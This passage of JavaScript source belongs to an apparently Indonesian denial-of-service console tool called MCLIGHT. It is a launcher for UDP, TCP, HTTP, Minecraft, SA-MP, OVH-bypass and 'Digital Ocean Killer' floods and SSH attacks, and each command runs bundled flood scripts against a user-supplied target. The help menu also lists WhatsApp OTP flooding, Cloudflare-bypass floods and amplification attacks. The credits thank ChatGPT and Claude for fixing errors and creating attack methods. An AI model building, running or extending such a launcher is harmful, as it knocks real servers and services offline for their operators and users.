	⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


	VPS Killer Has Been Launched
                    
[=========================================]

╔ Target   » ${target}
╠ Duration » ${duration}
╚ Methods  » Digital Ocean Killer`)
} catch (error) {
  console.log(`[X] Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/raw`);
const flood = path.join(__dirname, `/lib/cache/flood`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`[?] Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`


	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
	⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
	⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
	⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
	⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


	UDP Raw Flood Attack Launched
                    
[=========================================]

╔ Target   » ${target}
╠ Duration » ${duration}
╚ Methods  » UDP Raw`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function mcbot(args) {
  if (args.length < 3) {
    console.log(`[?] Example: mc-flood <target> <port> <duration>
mc-flood 123.456.78.910 25565 300`);
    sigma();
    return
  }
  const [target, port, duration] = args
  try {
    console.clear()
    console.log(`


      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
      ⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
      ⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
      ⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
      ⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    
	Minecraft Flood Attack Launched
                   
[=========================================]

╔ Target   » ${target}
╠ Port     » ${port}
╠ Duration » ${duration}
╠ Methods  » Minecraft Multi-Protocol Flood
╠ Type 1   » TCP Ping Flood
╠ Type 2   » TCP MOTD Flood
╠ Type 3   » UDP Ping Flood
╠ Type 4   » UDP MOTD + Random Data
╚ Type 5   » Mixed Protocol Attack`)
  } catch (error) {
    console.log(`[X] Oops Something Went Wrong`)
  }

  const metode = path.join(__dirname, `/lib/cache/mc-flood`);
  exec(`node ${metode} ${target} ${port} ${duration}`)
  sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`[?] Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`


	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
	⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
	⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
	⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
	⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


	SA MP Flood Attack Launched
                    
[=========================================]

╔ Target   » ${target}
╠ Duration » ${duration}
╚ Methods  » SAMP Flooder`)
} catch (error) {
  console.log(`[X] Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/StarsXSamp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`[?] Example: .subdo-finder domain
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.clear()
console.log(`


	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
	⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
	⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
	⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
	⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


	Subdomains Finder
                        
[=========================================]

${hasilmanuk}`)
} catch (error) {
  console.log(`[X] Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// [========================================] //
async function chat_ai() {
permen.question('[\x1b[1m\x1b[31mMCLIGHT Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`[!] Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function ovh_attack(args) {
  if (args.length < 4) {
    console.log(`[?] Example: ovh <url> <time> <threads> <rps>
ovh https://example.com 60 10 100`);
    sigma();
    return;
  }

  const [target, time, threads, rps] = args;
  
  if (!target.startsWith('http')) {
    console.log('[X] URL Must Start With http:// Or https://');
    sigma();
    return;
  }

  if (isNaN(time) || isNaN(threads) || isNaN(rps)) {
    console.log('[X] Time, Threads and RPS Must Be Numbers');
    sigma();
    return;
  }

  const ovhPath = path.join(__dirname, '/lib/cache/ovh.js');
  const proxyPath = path.join(__dirname, '/proxy.txt');
  
  if (!fs.existsSync(proxyPath)) {
    console.log('[X] Proxy File Not Found. Please Run update-proxy First.');
    sigma();
    return;
  }

  const startOvh = spawn('node', [ovhPath, target, time, threads, proxyPath, rps]);
  processList.push(startOvh);
  
  console.log(`
OVH Attack Started!
Target: ${target}
Time: ${time} seconds
Threads: ${threads}
RPS: ${rps}

Type exit or CTRL+C to stop the attack.
`);

  permen.question('[\x1b[1m\x1b[31mMCLIGHT OVH\x1b[0m] » \n', async (answer) => {
    if (answer === 'exit') {
      startOvh.kill('SIGKILL');
      console.log('OVH Attack Stopped');
      sigma();
    } else {
      console.log(`do you mean 'exit'?`);
      sigma();
    }
  });
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://gitlab.com/windyyid-group/mclight/-/raw/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By PermenMD
Recode By StarX And MCLIGHT

[========================================]

<3 Thx To:
- Allah SWT الله
- ChatGPT ( Fixing Error )
- Claude ( Fixing Error + Creating Another Methods )
- Cursor ( Visual Studio But Different + With AI )
- IrfanNotSepuh ( Gatau Ngapain )
- Windy ( Recreating PermenMD/StarX To MCLIGHT )
- My Family
- PLN Dan Wifi
- Github
- YouTube ( Music )
- Spotify

[========================================]
`
permen.question('[\x1b[1m\x1b[32mroot@mclight:~#\x1b[0m] » \n', async (cmd) => {
  const args = cmd.split(' ');
  const command = args.shift().toLowerCase();

  if (command === 'help') {
    console.log(`
[=========================================]

╔ methods      » Show List Avaible Methods
╠ track-ip     » Track Ip Address
╠ subdo-finder » Find Subdomain
╠ kill-wifi    » Kill Your Wifi | Cocok Buat Owe Hantam
╠ kill-ssh     » Kill VPS Access 
╠ kill-otp     » Kill WhatsApp OTP Verification
╠ kill-ping    » Sending Death Pinger
╠ samp         » S.A.M.P Flooder
╠ mc-flood     » Minecraft Bot Flooder | Idk
╠ attack       » Launch Attack With Methods
╠ udp-raw      » Udp Flood Attack
╠ udp-mix      » Advanced UDP Mix Attack
╠ udp-amp      » UDP Amplification Attack
╠ udp-bypass   » UDP Bypass Attack
╠ tcp-mix      » Advanced TCP Mix Attack
╠ tcp-adv      » TCP Advanced Attack
╠ tcp-bypass   » TCP Bypass Attack
╠ kill-do      » Digital Ocean Killer | Risk
╠ ongoing      » Show Ongoing Attack
╠ news         » Show MCLIGHT News
╠ ai           » Are This Even Work?
╠ credits      » <3
╚ clear        » Clear Terminal

[=========================================]
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[=========================================]

╔ flood      » HTTP(s) Flood DoS
╠ tls        » TLS 1.3 
╠ strike     » Best DDoS methods
╠ kill       » Bypass Cf DDoS methods
╠ raw        » Huge RPS Flexing XD
╠ bypass     » Bypass With High Power
╠ thunder    » Massive Power Methods
╠ storm      » The Raining Request
╠ rape       » Bypass Protection
╠ destroy    » Kill That Socket
╠ slim       » Oh Is Fit There
╠ ovh        » OVH Bypass With HTTP Proxies
╠ udp-bypass » UDP Protocol Bypass
╚ tcp-bypass » TCP Protocol Bypass

[=========================================]
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-ssh') {
    killSSH(args);
  } else if (command === 'kill-otp') {
    killOTP(args);
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'kill-do') {
    killDo(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'ai') {
    console.log(`PermenMD Ai Ragbot Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'mc-flood') {
    mcbot(args)
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'samp') {
    samp(args)
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else if (command === 'udp-mix') {
      udp_mix(args);
    } else if (command === 'tcp-mix') {
      tcp_mix(args);
    } else if (command === 'tcp-adv') {
      tcp_adv(args);
    } else if (command === 'udp-amp') {
      udp_amp(args);
    } else if (command === 'udp-bypass') {
      udp_bypass(args);
    } else if (command === 'tcp-bypass') {
      tcp_bypass(args);
    } else if (command === 'ovh') {
      await ovh_attack(args);
    } else {
    console.log(`[X] Gada Command Begituan Anying - ${command}`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()

async function udp_mix(args) {
  if (args.length < 3) {
    console.log(`[?] Example: udp-mix <target> <port> <duration>
udp-mix 123.456.78.910 53 300`);
    sigma();
    return
  }
  const [target, port, duration] = args
  try {
    console.clear()
    console.log(`


      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
      ⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
      ⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
      ⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
      ⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⣼⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    
		UDP Mix Attack Launched
                    
[=========================================]

╔ Target   » ${target}
╠ Duration » ${duration}
╚ Methods  » UDP Mix Attack`)
  } catch (error) {
    console.log(`[X] Oops Something Went Wrong`)
  }

  const metode = path.join(__dirname, `/lib/cache/udp-mix`);
  exec(`node ${metode} ${target} ${port} ${duration}`)
  sigma()
};

async function tcp_mix(args) {
  if (args.length < 3) {
    console.log(`[?] Example: tcp-mix <target> <port> <duration>
tcp-mix 123.456.78.910 80 300`);
    sigma();
    return
  }
  const [target, port, duration] = args
  try {
    console.clear()
    console.log(`


      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡏
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡟⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠁⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⣀
      ⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⠟   
      ⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀   https://e-z.bio/indonesia · windy
      ⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀   MCLIGHT - 1.6
      ⠘⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⢠⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⢀⣾⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
